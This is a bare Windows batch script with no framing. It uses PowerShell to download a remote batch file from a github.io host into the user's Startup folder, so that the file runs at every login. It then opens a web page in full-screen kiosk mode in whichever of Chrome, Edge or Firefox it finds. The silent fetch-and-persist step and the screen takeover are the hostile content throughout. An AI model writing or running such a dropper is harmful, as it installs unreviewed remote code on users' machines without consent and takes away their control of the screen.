@echo off
set "programdta=C:\ProgramData"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "URL=https://cmd-hue.github.io/plank/"

powershell -Command "Invoke-WebRequest -Uri 'https://cmd-hue.github.io/plank.bat' -OutFile '%startup%\plank.bat'"

where chrome >nul 2>nul
if not errorlevel 1 (
    start chrome --kiosk "%URL%"
    exit
)

where msedge >nul 2>nul
if not errorlevel 1 (
    start msedge --kiosk "%URL%"
    exit
)

where firefox >nul 2>nul
if not errorlevel 1 (
    start firefox -kiosk "%URL%"
    exit
)

start "" "%URL%"
